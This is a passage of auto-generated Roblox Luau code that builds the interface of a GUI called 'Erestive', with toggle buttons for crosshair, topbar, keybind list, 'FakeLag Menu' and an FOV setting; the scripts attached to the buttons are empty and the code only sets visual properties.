G2L["292"] = Instance.new("ImageLabel", G2L["291"]);
G2L["292"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["292"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["292"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["292"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["292"]["BackgroundTransparency"] = 1;
G2L["292"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.UICorner
G2L["293"] = Instance.new("UICorner", G2L["290"]);
G2L["293"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.UIGradient
G2L["294"] = Instance.new("UIGradient", G2L["290"]);
G2L["294"]["Rotation"] = -90;
G2L["294"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button
G2L["295"] = Instance.new("TextButton", G2L["290"]);
G2L["295"]["TextTransparency"] = 1;
G2L["295"]["TextSize"] = 14;
G2L["295"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["295"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["295"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["295"]["ZIndex"] = 2;
G2L["295"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["295"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["295"]["Text"] = [[ ]];
G2L["295"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.server
G2L["296"] = Instance.new("LocalScript", G2L["295"]);
G2L["296"]["Name"] = [[server]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.UICorner
G2L["297"] = Instance.new("UICorner", G2L["295"]);
G2L["297"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.OnOrOff
G2L["298"] = Instance.new("TextLabel", G2L["28f"]);
G2L["298"]["TextWrapped"] = true;
G2L["298"]["ZIndex"] = 2;
G2L["298"]["TextSize"] = 14;
G2L["298"]["TextScaled"] = true;
G2L["298"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["298"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["298"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["298"]["BackgroundTransparency"] = 1;
G2L["298"]["Size"] = UDim2.new(0.68443, 0, 0.5158, 0);
G2L["298"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["298"]["Text"] = [[Autojump]];
G2L["298"]["Name"] = [[OnOrOff]];
G2L["298"]["Position"] = UDim2.new(0.07602, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UICorner
G2L["299"] = Instance.new("UICorner", G2L["28f"]);
G2L["299"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UIGradient
G2L["29a"] = Instance.new("UIGradient", G2L["28f"]);
G2L["29a"]["Rotation"] = -90;
G2L["29a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.UIStroke
G2L["29b"] = Instance.new("UIStroke", G2L["28f"]);
G2L["29b"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3
G2L["29c"] = Instance.new("ScrollingFrame", G2L["a6"]);
G2L["29c"]["Visible"] = false;
G2L["29c"]["Active"] = true;
G2L["29c"]["ZIndex"] = 3;
G2L["29c"]["BorderSizePixel"] = 0;
G2L["29c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29c"]["Name"] = [[Frame3]];
G2L["29c"]["ScrollBarImageTransparency"] = 1;
G2L["29c"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["29c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["29c"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29c"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["29c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29c"]["ScrollBarThickness"] = 0;
G2L["29c"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.UIGridLayout
G2L["29d"] = Instance.new("UIGridLayout", G2L["29c"]);
G2L["29d"]["CellSize"] = UDim2.new(0, 145, 0, 40);
G2L["29d"]["CellPadding"] = UDim2.new(0, 15, 0, 20);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.UIPadding
G2L["29e"] = Instance.new("UIPadding", G2L["29c"]);
G2L["29e"]["PaddingTop"] = UDim.new(0, 5);
G2L["29e"]["PaddingRight"] = UDim.new(0, 5);
G2L["29e"]["PaddingLeft"] = UDim.new(0, 1);
G2L["29e"]["PaddingBottom"] = UDim.new(0, 1);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton
G2L["29f"] = Instance.new("TextButton", G2L["29c"]);
G2L["29f"]["TextWrapped"] = true;
G2L["29f"]["BorderSizePixel"] = 0;
G2L["29f"]["TextSize"] = 14;
G2L["29f"]["TextScaled"] = true;
G2L["29f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29f"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["29f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["29f"]["BackgroundTransparency"] = 0.85;
G2L["29f"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["29f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29f"]["Text"] = [[KeyboardVisible]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
G2L["2a0"] = Instance.new("LocalScript", G2L["29f"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
G2L["2a1"] = Instance.new("LocalScript", G2L["29f"]);
G2L["2a1"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UICorner
G2L["2a2"] = Instance.new("UICorner", G2L["29f"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UIStroke
G2L["2a3"] = Instance.new("UIStroke", G2L["29f"]);
G2L["2a3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2a3"]["Thickness"] = 0.8;
G2L["2a3"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton
G2L["2a4"] = Instance.new("TextButton", G2L["29c"]);
G2L["2a4"]["TextWrapped"] = true;
G2L["2a4"]["BorderSizePixel"] = 0;
G2L["2a4"]["TextSize"] = 14;
G2L["2a4"]["TextScaled"] = true;
G2L["2a4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a4"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2a4"]["BackgroundTransparency"] = 0.85;
G2L["2a4"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a4"]["Text"] = [[TopbarVisible]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
G2L["2a5"] = Instance.new("LocalScript", G2L["2a4"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
G2L["2a6"] = Instance.new("LocalScript", G2L["2a4"]);
G2L["2a6"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UICorner
G2L["2a7"] = Instance.new("UICorner", G2L["2a4"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UIStroke
G2L["2a8"] = Instance.new("UIStroke", G2L["2a4"]);
G2L["2a8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2a8"]["Thickness"] = 0.8;
G2L["2a8"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible1
G2L["2a9"] = Instance.new("TextButton", G2L["29c"]);
G2L["2a9"]["TextWrapped"] = true;
G2L["2a9"]["BorderSizePixel"] = 0;
G2L["2a9"]["TextSize"] = 14;
G2L["2a9"]["TextScaled"] = true;
G2L["2a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a9"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2a9"]["BackgroundTransparency"] = 0.85;
G2L["2a9"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a9"]["Text"] = [[CrosshairVisible1]];
G2L["2a9"]["Name"] = [[CrosshairVisible1]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible1.LocalScript
G2L["2aa"] = Instance.new("LocalScript", G2L["2a9"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible1.Animations
G2L["2ab"] = Instance.new("LocalScript", G2L["2a9"]);
G2L["2ab"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible1.UICorner
G2L["2ac"] = Instance.new("UICorner", G2L["2a9"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible1.UIStroke
G2L["2ad"] = Instance.new("UIStroke", G2L["2a9"]);
G2L["2ad"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2ad"]["Thickness"] = 0.8;
G2L["2ad"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton
G2L["2ae"] = Instance.new("TextButton", G2L["29c"]);
G2L["2ae"]["TextWrapped"] = true;
G2L["2ae"]["BorderSizePixel"] = 0;
G2L["2ae"]["TextSize"] = 14;
G2L["2ae"]["TextScaled"] = true;
G2L["2ae"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ae"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2ae"]["BackgroundTransparency"] = 0.85;
G2L["2ae"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ae"]["Text"] = [[Remove Gui]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
G2L["2af"] = Instance.new("LocalScript", G2L["2ae"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
G2L["2b0"] = Instance.new("LocalScript", G2L["2ae"]);
G2L["2b0"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UICorner
G2L["2b1"] = Instance.new("UICorner", G2L["2ae"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UIStroke
G2L["2b2"] = Instance.new("UIStroke", G2L["2ae"]);
G2L["2b2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2b2"]["Thickness"] = 0.8;
G2L["2b2"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton
G2L["2b3"] = Instance.new("TextButton", G2L["29c"]);
G2L["2b3"]["TextWrapped"] = true;
G2L["2b3"]["BorderSizePixel"] = 0;
G2L["2b3"]["TextSize"] = 14;
G2L["2b3"]["TextScaled"] = true;
G2L["2b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b3"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2b3"]["BackgroundTransparency"] = 0.85;
G2L["2b3"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b3"]["Text"] = [[BindListVisible]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
G2L["2b4"] = Instance.new("LocalScript", G2L["2b3"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
G2L["2b5"] = Instance.new("LocalScript", G2L["2b3"]);
G2L["2b5"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UICorner
G2L["2b6"] = Instance.new("UICorner", G2L["2b3"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UIStroke
G2L["2b7"] = Instance.new("UIStroke", G2L["2b3"]);
G2L["2b7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2b7"]["Thickness"] = 0.8;
G2L["2b7"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton
G2L["2b8"] = Instance.new("TextButton", G2L["29c"]);
G2L["2b8"]["TextWrapped"] = true;
G2L["2b8"]["BorderSizePixel"] = 0;
G2L["2b8"]["TextSize"] = 14;
G2L["2b8"]["TextScaled"] = true;
G2L["2b8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b8"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2b8"]["BackgroundTransparency"] = 0.85;
G2L["2b8"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b8"]["Text"] = [[Key Bg]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
G2L["2b9"] = Instance.new("LocalScript", G2L["2b8"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
G2L["2ba"] = Instance.new("LocalScript", G2L["2b8"]);
G2L["2ba"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UICorner
G2L["2bb"] = Instance.new("UICorner", G2L["2b8"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UIStroke
G2L["2bc"] = Instance.new("UIStroke", G2L["2b8"]);
G2L["2bc"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2bc"]["Thickness"] = 0.8;
G2L["2bc"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton
G2L["2bd"] = Instance.new("TextButton", G2L["29c"]);
G2L["2bd"]["TextWrapped"] = true;
G2L["2bd"]["BorderSizePixel"] = 0;
G2L["2bd"]["TextSize"] = 14;
G2L["2bd"]["TextScaled"] = true;
G2L["2bd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2bd"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2bd"]["BackgroundTransparency"] = 0.85;
G2L["2bd"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2bd"]["Text"] = [[FakeLag Menu]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
G2L["2be"] = Instance.new("LocalScript", G2L["2bd"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
G2L["2bf"] = Instance.new("LocalScript", G2L["2bd"]);
G2L["2bf"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UICorner
G2L["2c0"] = Instance.new("UICorner", G2L["2bd"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UIStroke
G2L["2c1"] = Instance.new("UIStroke", G2L["2bd"]);
G2L["2c1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2c1"]["Thickness"] = 0.8;
G2L["2c1"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton
G2L["2c2"] = Instance.new("TextButton", G2L["29c"]);
G2L["2c2"]["TextWrapped"] = true;
G2L["2c2"]["BorderSizePixel"] = 0;
G2L["2c2"]["TextSize"] = 14;
G2L["2c2"]["TextScaled"] = true;
G2L["2c2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c2"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2c2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2c2"]["BackgroundTransparency"] = 0.85;
G2L["2c2"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2c2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c2"]["Text"] = [[Use avatar in useraname]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
G2L["2c3"] = Instance.new("LocalScript", G2L["2c2"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
G2L["2c4"] = Instance.new("LocalScript", G2L["2c2"]);
G2L["2c4"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UICorner
G2L["2c5"] = Instance.new("UICorner", G2L["2c2"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UIStroke
G2L["2c6"] = Instance.new("UIStroke", G2L["2c2"]);
G2L["2c6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2c6"]["Thickness"] = 0.8;
G2L["2c6"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton
G2L["2c7"] = Instance.new("TextButton", G2L["29c"]);
G2L["2c7"]["TextWrapped"] = true;
G2L["2c7"]["BorderSizePixel"] = 0;
G2L["2c7"]["TextSize"] = 14;
G2L["2c7"]["TextScaled"] = true;
G2L["2c7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c7"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2c7"]["BackgroundTransparency"] = 0.85;
G2L["2c7"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c7"]["Text"] = [[TopbarBlur]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
G2L["2c8"] = Instance.new("LocalScript", G2L["2c7"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
G2L["2c9"] = Instance.new("LocalScript", G2L["2c7"]);
G2L["2c9"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UICorner
G2L["2ca"] = Instance.new("UICorner", G2L["2c7"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.UIStroke
G2L["2cb"] = Instance.new("UIStroke", G2L["2c7"]);
G2L["2cb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2cb"]["Thickness"] = 0.8;
G2L["2cb"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible2
G2L["2cc"] = Instance.new("TextButton", G2L["29c"]);
G2L["2cc"]["TextWrapped"] = true;
G2L["2cc"]["BorderSizePixel"] = 0;
G2L["2cc"]["TextSize"] = 14;
G2L["2cc"]["TextScaled"] = true;
G2L["2cc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2cc"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2cc"]["BackgroundTransparency"] = 0.85;
G2L["2cc"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2cc"]["Text"] = [[CrosshairVisible2]];
G2L["2cc"]["Name"] = [[CrosshairVisible2]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible2.LocalScript
G2L["2cd"] = Instance.new("LocalScript", G2L["2cc"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible2.Animations
G2L["2ce"] = Instance.new("LocalScript", G2L["2cc"]);
G2L["2ce"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible2.UICorner
G2L["2cf"] = Instance.new("UICorner", G2L["2cc"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible2.UIStroke
G2L["2d0"] = Instance.new("UIStroke", G2L["2cc"]);
G2L["2d0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2d0"]["Thickness"] = 0.8;
G2L["2d0"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible3
G2L["2d1"] = Instance.new("TextButton", G2L["29c"]);
G2L["2d1"]["TextWrapped"] = true;
G2L["2d1"]["BorderSizePixel"] = 0;
G2L["2d1"]["TextSize"] = 14;
G2L["2d1"]["TextScaled"] = true;
G2L["2d1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d1"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2d1"]["BackgroundTransparency"] = 0.85;
G2L["2d1"]["Size"] = UDim2.new(1, 0, -0.06345, 50);
G2L["2d1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d1"]["Text"] = [[CrosshairVisible3]];
G2L["2d1"]["Name"] = [[CrosshairVisible3]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible3.LocalScript
G2L["2d2"] = Instance.new("LocalScript", G2L["2d1"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible3.Animations
G2L["2d3"] = Instance.new("LocalScript", G2L["2d1"]);
G2L["2d3"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible3.UICorner
G2L["2d4"] = Instance.new("UICorner", G2L["2d1"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible3.UIStroke
G2L["2d5"] = Instance.new("UIStroke", G2L["2d1"]);
G2L["2d5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2d5"]["Thickness"] = 0.8;
G2L["2d5"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump
G2L["2d6"] = Instance.new("Frame", G2L["29c"]);
G2L["2d6"]["Visible"] = false;
G2L["2d6"]["BorderSizePixel"] = 0;
G2L["2d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d6"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["2d6"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["2d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d6"]["Name"] = [[Jump]];
G2L["2d6"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV
G2L["2d7"] = Instance.new("Frame", G2L["2d6"]);
G2L["2d7"]["BorderSizePixel"] = 0;
G2L["2d7"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["2d7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2d7"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["2d7"]["Name"] = [[FOV]];
G2L["2d7"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.Textl
G2L["2d8"] = Instance.new("TextLabel", G2L["2d7"]);
G2L["2d8"]["TextWrapped"] = true;
G2L["2d8"]["ZIndex"] = 9;
G2L["2d8"]["TextSize"] = 14;
G2L["2d8"]["TextScaled"] = true;
G2L["2d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2d8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d8"]["BackgroundTransparency"] = 1;
G2L["2d8"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["2d8"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2d8"]["Text"] = [[FOV]];
G2L["2d8"]["Name"] = [[Textl]];
G2L["2d8"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.WhiteBar
G2L["2d9"] = Instance.new("Frame", G2L["2d7"]);
G2L["2d9"]["BorderSizePixel"] = 0;
G2L["2d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d9"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["2d9"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["2d9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2d9"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.WhiteBar.UIGradient
G2L["2da"] = Instance.new("UIGradient", G2L["2d9"]);
G2L["2da"]["Rotation"] = 90;
G2L["2da"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.UICorner
G2L["2db"] = Instance.new("UICorner", G2L["2d7"]);
G2L["2db"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig
G2L["2dc"] = Instance.new("Frame", G2L["2d7"]);
G2L["2dc"]["BorderSizePixel"] = 0;
G2L["2dc"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["2dc"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["2dc"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["2dc"]["Name"] = [[FOVConfig]];
G2L["2dc"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.UICorner
G2L["2dd"] = Instance.new("UICorner", G2L["2dc"]);
G2L["2dd"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV
G2L["2de"] = Instance.new("Frame", G2L["2dc"]);
G2L["2de"]["Visible"] = false;
G2L["2de"]["ZIndex"] = 2;
G2L["2de"]["BorderSizePixel"] = 0;
G2L["2de"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["2de"]["Size"] = UDim2.new(1.80846, 0, 0.36356, 0);
G2L["2de"]["Position"] = UDim2.new(-0.80846, 0, 1.21908, 0);
G2L["2de"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2de"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.Animations
G2L["2df"] = Instance.new("LocalScript", G2L["2de"]);
G2L["2df"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["2e0"] = Instance.new("ImageLabel", G2L["2df"]);
G2L["2e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e0"]["ImageTransparency"] = 0.6;
